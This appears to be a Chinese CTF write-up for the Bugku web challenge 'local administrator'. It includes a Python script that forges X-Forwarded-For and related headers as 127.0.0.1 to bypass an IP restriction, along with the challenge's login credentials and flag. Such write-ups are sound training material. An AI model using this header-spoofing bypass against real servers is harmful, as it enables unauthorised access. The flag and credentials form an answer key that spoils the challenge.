【Bugku CTF】Web-本地管理员 Writeup

操作者：何芊宏 | 操作日期：2026.9.13 | 分类：CTF | 标签：Bugku, Web, 伪造IP, PHP

1. 题目信息

  • 平台：Bugku CTF
  • 分类：Web
  • 题目名称：本地管理员
  • 描述：本地管理员
  • 提交格式：flag{}

2. 解题思路

题目名称为“本地管理员”，暗示服务器存在 IP 访问限制，只允许 127.0.0.1 访问。页面为管理员登录系统，我们需要先找到账号密码，再伪造请求头绕过 IP 限制。

3. 操作步骤

  1. 启动场景，出现管理员登录界面。
  2. 按 F12 查看源码，在底部发现被注释的 Base64 字符串：<!-- dGVzdDp0ZXN0 -->。
  3. 解码 Base64 得到疑似账号密码：test:test。
  4. 尝试直接输入账号密码登录，提示 IP禁止访问，请联系本地管理员登陆，IP已被记录。
  5. 编写 Python 脚本，伪造 IP 请求头发送 POST 请求（基于表单源码，参数名为 user 和 pass）：
import requests
import re

url = "http://160.202.254.160:12412/"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...',
    'X-Forwarded-For': '127.0.0.1',
    'X-Real-IP': '127.0.0.1',
    'Client-IP': '127.0.0.1'
}
data = {'user': 'admin', 'pass': 'test123'}

r = requests.post(url, headers=headers, data=data)
r.encoding = 'utf-8'
match = re.search(r'(flag|key)\{.*?\}', r.text, re.IGNORECASE)
if match:
    print(match.group(0))
  1. 首次运行提示 Invalid credentials!。查阅评论区大佬提示，得知真实密码为 admin:test123。
  2. 修改账号密码重新运行，成功获取 Flag：flag{8450679965a5b18985f2d8f64faa83ad}。

4. 踩坑记录与复盘

  • 源码注释不一定是真的：源码注释里 Base64 解码出来是 test:test，但实际生效的登录凭证是 admin:test123。这告诉我们，在代码审计中注释里的内容往往只是烟雾弹，不能盲目相信，还是得结合报错信息和评论区情报去判断。
  • 伪造 IP 需要多请求头配合：由于不同的 Web 服务器和框架识别代理 IP 的字段不同，写脚本时同时带上 X-Forwarded-For、X-Real-IP 和 Client-IP 是最稳妥的做法。
  • 注意 HTML 表单的参数名：在写登录脚本时，千万别凭感觉写参数名。最好先看页面源码里的 <input name="..."> 属性，比如本题实际接收的参数是 user 和 pass，而不是 username 和 password。
  • 善用评论区：当你卡在密码验证或者无法出 flag 时，多去看平台的评论区。往往会有已经解出题目的师傅给出关键提示（比如直接告诉你真实账号密码），这是 CTF 实战中非常重要的“情报收集”能力。
